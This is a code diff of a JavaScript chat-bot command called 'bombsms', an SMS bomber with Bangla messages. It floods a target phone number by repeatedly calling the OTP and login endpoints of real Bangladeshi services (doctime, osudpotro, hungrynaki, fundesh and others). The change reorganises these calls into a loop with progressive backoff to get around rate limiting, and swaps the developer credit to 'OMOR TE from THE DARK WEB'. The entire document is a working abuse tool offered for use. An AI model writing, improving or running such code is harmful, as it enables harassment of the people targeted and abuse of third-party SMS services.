@@ -1,9 +1,8 @@
-
 module.exports.config = {
   name: "bombsms",
   version: "2.0.0",
   hasPermssion: 0,
-  credits: "Ahsan Habib - Bangladesh Cyber 2.0", // Original developer credit preserved
+  credits: "OMOR TE from THE DARK WEB", // Original developer credit preserved
   description: "SMS বোম্বার বন্ধ করতে /bombsms off",
   commandCategory: "Tool",
   usages: "START -> /bombsms 01xxxxxxxxx limit | OFF --> /bombsms off",
@@ -273,169 +272,74 @@ FACEBOOK  : Bangladesh Cyber 2.0
     // Convert cookies object to cookie string
     const cookieString = Object.entries(cookies9).map(([key, value]) => `${key}=${value}`).join('; ');
     
-    // Main bombing function - runs asynchronously
+    // Define all API functions for better organization
+    const apiCalls = [
+        async () => await axios.get(url1, { headers: headers }),
+        async () => await axios.post(url2, data1, { headers: headers2 }),
+        async () => await axios.get(url3, { headers: headers3 }),
+        async () => await axios.get(url4, { headers: headers4 }),
+        async () => await axios.post('https://admin.doctime.com.bd/api/authenticate', data2, { headers: headers5 }),
+        async () => await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data3, { headers: headers6 }),
+        async () => await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data4, { headers: headers7 }),
+        async () => await axios.post('https://api-v4-1.hungrynaki.com/graphql', data8, { headers: headers8 }),
+        async () => await axios.post('https://fundesh.com.bd/api/auth/generateOTP', json_data9, {
+            headers: { ...headers9, 'Cookie': cookieString },
+            params: params9
+        }),
+        async () => await axios.get(url10, { headers: headers10 })
+    ];
+    
+    // Main bombing function - runs asynchronously with improved logic
     (async function startBombing() {
         let ses = 0;
         let lastUpdate = 0;
+        let consecutiveFailures = 0;
         
-        while (limit > ses && bombingFlags[threadID]) {
-            try {
-                const sent1 = await axios.get(url1, { headers: headers });
-                if (sent1.status === 200) {
-                    ses += 1;
-                    if (ses - lastUpdate >= 10 || ses === 1) { // Update every 10 SMS
-                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
-                        lastUpdate = ses;
+        while (ses < limit && bombingFlags[threadID]) {
+            let cycleSuccessCount = 0;
+            
+            // Try each API in sequence
+            for (let i = 0; i < apiCalls.length && ses < limit && bombingFlags[threadID]; i++) {
+                try {
+                    const response = await apiCalls[i]();
+                    if (response && (response.status === 200 || response.status === 201)) {
+                        ses += 1;
+                        cycleSuccessCount += 1;
+                        consecutiveFailures = 0;
+                        
+                        // Update progress every few SMS or immediately for first few
+                        if (ses - lastUpdate >= 5 || ses <= 5) {
+                            api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
+                            lastUpdate = ses;
+                        }
                     }
+                } catch (error) {
+                    // Continue on error - equivalent to Python's pass statement
+                    consecutiveFailures += 1;
                 }
-            } catch (error) {
-                // Continue on error - equivalent to Python's pass statement
+                
+                // Small delay between API calls
+                await sleep(500); // Increased delay to avoid rate limiting
+                
+                // Check if bombing should stop
+                if (!bombingFlags[threadID]) break;
             }
             
-            if (!bombingFlags[threadID]) break;
-            
-            try {
-                const sent2 = await axios.post(url2, data1, { headers: headers2 });
-                if (sent2.status === 200) {
-                    ses += 1;
-                    if (ses - lastUpdate >= 10 || ses === 1) {
-                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
-                        lastUpdate = ses;
-                    }
+            // If no APIs worked in this cycle, increase delay to avoid rate limiting
+            if (cycleSuccessCount === 0) {
+                consecutiveFailures += 1;
+                await sleep(2000 * consecutiveFailures); // Progressive backoff
+                
+                // If too many consecutive failures, inform user
+                if (consecutiveFailures >= 5) {
+                    api.sendMessage(`⚠️ APIs may be rate limiting. Continuing with longer delays... Current: ${ses}/${limit}`, threadID);
+                    consecutiveFailures = 0; // Reset counter
                 }
-            } catch (error) {
-                // Continue on error
+            } else {
+                // Reset consecutive failures if at least one API worked
+                consecutiveFailures = 0;
+                await sleep(1000); // Regular delay between cycles
             }
-            
-            if (!bombingFlags[threadID]) break;
-            
-            try {
-                const sent3 = await axios.get(url3, { headers: headers3 });
-                if (sent3.status === 200) {
-                    ses += 1;
-                    if (ses - lastUpdate >= 10 || ses === 1) {
-                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
-                        lastUpdate = ses;
-                    }
-                }
-            } catch (error) {
-                // Continue on error
-            }
-            
-            if (!bombingFlags[threadID]) break;
-            
-            try {
-                const sent4 = await axios.get(url4, { headers: headers4 });
-                if (sent4.status === 200) {
-                    ses += 1;
-                    if (ses - lastUpdate >= 10 || ses === 1) {
-                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
-                        lastUpdate = ses;
-                    }
-                }
-            } catch (error) {
-                // Continue on error
-            }
-            
-            if (!bombingFlags[threadID]) break;
-            
-            try {
-                const sent5 = await axios.post('https://admin.doctime.com.bd/api/authenticate', data2, { headers: headers5 });
-                if (sent5.status === 200) {
-                    ses += 1;
-                    if (ses - lastUpdate >= 10 || ses === 1) {
-                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
-                        lastUpdate = ses;
-                    }
-                }
-            } catch (error) {
-                // Continue on error
-            }
-            
-            if (!bombingFlags[threadID]) break;
-            
-            try {
-                const sent6 = await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data3, { headers: headers6 });
-                if (sent6.status === 200) {
-                    ses += 1;
-                    if (ses - lastUpdate >= 10 || ses === 1) {
-                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
-                        lastUpdate = ses;
-                    }
-                }
-            } catch (error) {
-                // Continue on error
-            }
-            
-            if (!bombingFlags[threadID]) break;
-            
-            try {
-                const sent7 = await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data4, { headers: headers7 });
-                if (sent7.status === 200) {
-                    ses += 1;
-                    if (ses - lastUpdate >= 10 || ses === 1) {
-                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
-                        lastUpdate = ses;
-                    }
-                }
-            } catch (error) {
-                // Continue on error
-            }
-            
-            if (!bombingFlags[threadID]) break;
-            
-            try {
-                const sent8 = await axios.post('https://api-v4-1.hungrynaki.com/graphql', data8, { headers: headers8 });
-                if (sent8.status === 200) {
-                    ses += 1;
-                    if (ses - lastUpdate >= 10 || ses === 1) {
-                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
-                        lastUpdate = ses;
-                    }
-                }
-            } catch (error) {
-                // Continue on error
-            }
-            
-            if (!bombingFlags[threadID]) break;
-            
-            try {
-                const sent9 = await axios.post(
-                    'https://fundesh.com.bd/api/auth/generateOTP',
-                    json_data9,
-                    {
-                        headers: { ...headers9, 'Cookie': cookieString },
-                        params: params9
-                    }
-                );
-                if (sent9.status === 200) {
-                    ses += 1;
-                    if (ses - lastUpdate >= 10 || ses === 1) {
-                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
-                        lastUpdate = ses;
-                    }
-                }
-            } catch (error) {
-                // Continue on error
-            }
-            
-            if (!bombingFlags[threadID]) break;
-            
-            try {
-                const sent10 = await axios.get(url10, { headers: headers10 });
-                if (sent10.status === 200) {
-                    ses += 1;
-                    if (ses - lastUpdate >= 10 || ses === 1) {
-                        api.sendMessage(`✅ SMS পাঠানো হয়েছে: ${ses}/${limit} ♻️`, threadID);
-                        lastUpdate = ses;
-                    }
-                }
-            } catch (error) {
-                // Continue on error
-            }
-            
-            // Small delay to prevent overwhelming the APIs
-            await sleep(100);
         }
         
         // Final completion message
@@ -454,12 +358,15 @@ FACEBOOK  : Bangladesh Cyber 2.0
 মোট পাঠানো SMS: ${ses}/${limit}
 লক্ষ্য নম্বর: ${num}
 
-Developer: Ahsan Habib
-Team: Bangladesh Cyber 2.0`;
+Developer: OMOR TE from THE DARK WEB
+Team: MW LEGENDS`;
             
             api.sendMessage(completionMessage, threadID);
+        } else {
+            // If stopped manually
+            api.sendMessage(`⛔ SMS বোম্বিং বন্ধ করা হয়েছে।\nমোট পাঠানো SMS: ${ses}/${limit}`, threadID);
         }
     })();
 };
 
-                        
+      
